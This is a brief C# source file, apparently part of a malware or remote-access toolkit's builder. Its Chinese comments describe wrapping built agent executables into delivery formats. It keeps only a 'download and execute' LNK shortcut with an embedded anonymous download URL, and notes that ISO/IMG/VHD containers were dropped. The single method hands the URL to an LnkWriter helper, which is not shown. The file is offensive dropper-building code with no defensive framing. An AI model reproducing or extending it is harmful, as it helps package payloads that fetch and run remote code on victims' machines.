namespace LibraNextgen.Service.Services.Packaging;

/// <summary>
/// 构建产物打包服务：把已构建的 agent 可执行文件按需包装为投递格式。
/// 当前仅保留 LNK（快捷方式内嵌匿名下载 URL）；ISO/IMG/VHD 已移除。
/// </summary>
public static class BuilderPackageService
{
    /// <summary>生成「下载并执行」快捷方式：LNK 内嵌匿名下载 URL。</summary>
    public static byte[] CreateLnk(string artifactUrl) =>
        LnkWriter.CreateDownloadAndRun(artifactUrl);
}
